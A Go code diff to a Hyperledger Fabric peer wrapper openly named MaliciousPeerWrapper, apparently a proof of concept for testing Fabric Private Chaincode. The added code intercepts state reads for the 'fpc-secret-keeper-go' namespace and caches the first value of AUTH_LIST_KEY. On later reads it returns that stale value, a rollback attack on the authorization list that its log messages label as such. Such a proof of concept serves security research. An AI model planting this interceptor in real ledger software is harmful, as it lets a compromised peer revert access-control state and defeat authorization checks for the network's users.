@@ -11,15 +11,32 @@ import (
 	"github.com/hyperledger/fabric/core/ledger"
 )
 
+var fakeAuthList []byte
+
 type MaliciousPeerWrapper struct {
 	txSimulator ledger.TxSimulator
 }
 
 // GetState gets the value for given namespace and key. For a chaincode, the namespace corresponds to the chaincodeId
 func (m *MaliciousPeerWrapper) GetState(namespace string, key string) ([]byte, error) {
-	maliciousLogger.Warningf("Performing GetState start: namespace=%s, key=%s", namespace, key)
 	res, err := m.txSimulator.GetState(namespace, key)
-	maliciousLogger.Warningf("Performing GetState end: res=%s, err=%s", res, err)
+	if namespace != "fpc-secret-keeper-go" {
+		return res, err
+	}
+
+	maliciousLogger.Warningf("Performing GetState: namespace=%s, key=%s res=%x, err=%s", namespace, key, res, err)
+	if key == "AUTH_LIST_KEY" {
+		maliciousLogger.Warningf("This is my target, current fakeAuthList=%x", fakeAuthList)
+		if len(fakeAuthList) > 0 {
+			maliciousLogger.Warningf("My fakeAuthList got value, performing rollback attack now! value: %x", fakeAuthList)
+			return fakeAuthList, err
+		}
+		maliciousLogger.Warningf("My fakeAuthlist is empty: %x, copying res %x to fakeAuthlist.", fakeAuthList, res)
+		// ret := copy(fakeAuthList, res)
+		fakeAuthList = res
+		maliciousLogger.Warningf("Copy complete, latest fakeAuthList: %x", fakeAuthList)
+	}
+
 	return res, err
 }
 
